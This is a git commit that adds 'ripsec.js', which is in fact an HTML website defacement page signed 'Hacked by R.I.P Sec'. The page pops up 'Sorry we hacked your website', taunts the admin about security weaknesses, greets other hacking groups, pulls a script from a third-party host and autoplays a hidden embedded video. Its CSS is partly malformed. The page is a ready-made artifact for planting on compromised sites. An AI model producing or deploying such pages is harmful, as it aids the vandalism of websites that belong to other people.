c1646835df7b02fe8092f183f933eea488910259
moyoattacker <37435654+moyoattacker@users.noreply.github.com>
2018-09-30 02:25:01 +0700

    Create ripsec.js

---
+++ ripsec.js
@@ -0,0 +1,55 @@
+# ripsec
+<html>  <head>   <link rel="shortcut icon" href="https://image.ibb.co/m6kYEp/Favicon.png" />   <meta property="og:title" content="R.I.P Sec"/>   <meta property="og:description" content="Hacked By R.I.P Sec"/>   <title></title>   <link href='http://fonts.googleapis.com/css?family=Megrim' rel='stylesheet' type='text/css'>   <link href='http://fonts.googleapis.com/css?family=Quicksand' rel='stylesheet' type='text/css'>     <script src="http://e-mete.com/js/kdsnow.js"></script>  <style>    
+body{
+	background-image: url(https://s8.postimg.cc/b0if2pdp1/DARK.png);
+	#test{padding:20px}
+h1{text-align:center; color:#FFF}
+p{margin-bottom:10px; color:#FFF}
+ 100vh;
+}    .logo {
+	width: 100px;
+	height: 100px;
+	margin-top: 50px;
+	-webkit-filter: drop-shadow(0px 0px 7px #8b0000);
+	filter: drop-shadow(0px 0px 7px #8b0000);
+	margin-right: auto;
+	margin-bottom: 0;
+	margin-left: auto;
+}    .logo:hover{
+	/* [disabled]width: 300px; */
+	height: 300px;
+	-webkit-filter: drop-shadow(0px 0px 10px #8b0000);
+	opacity:0.4;
+	filter:alpha(opacity=40);
+transition: opacity .2s ease-out;     -moz-transition: opacity .2s ease-out;     -webkit-transition: opacity .2s ease-out;     -o-transition: opacity .2s ease-out;    }    .defacedby{     font-family: Megrim;     text-align: center;     color: black;     font-weight: bold;     font-size: 50px;   text-shadow: #0080FF 1px 2px 1px;        }    .glow {
+	font-family: Quicksand;
+	text-align: center;
+	color: #F00;
+	font-style: bold;
+	font-size: 15px;
+	margin-top: 16px;
+	text-shadow: black 1px 2px 1px;
+}    .greetings{     font-family: Quicksand;     text-align: center;     color: #ffffff;     font-size: 15px;     margin-top: 50px; text-shadow: black 1px 2px 1px;    }    
+</style>   </head>    <body>   <script>    alert('Sorry we hacked your website')   </script>   <center>
+  <img src="https://preview.ibb.co/bRkxS9/hand.png" width="224" height="224" class="logo"></img>
+</center>
+<div class="glow">
+<h1>
+<b><center><font color="#FF0000"> Hacked by R.I.P Sec </center></b>
+</h1>
+</div>
+<div class="glow">
+    <h1>
+<b><font color="#FF0000"><b><br>
+        <font color="red">Hi admin ...</br>
+  </b></h1>
+<h2><font color=red> Can you still see? Can you improve the security of your website? <br> 
+We see there are still many weaknesses on your website. <br>We see there are still many weaknesses on your website.<br>We only remind you to always update website security, even though security is just an illusion.</font></br></h2>
+
+</div>
+<div class="glow">
+<font color="#FF0000"><h2>Greetz :
+</h2>
+<h2> RedCode | Zeesujinx | Exibhionisme</h2>
+<br></footer></div>
+<embed src="http://www.youtube.com/v/zK200GQtYkI&autoplay=1" type="application/x-shockwave-flash"wmode="transparent" width="1" height="1"></embed>  </body> </html>
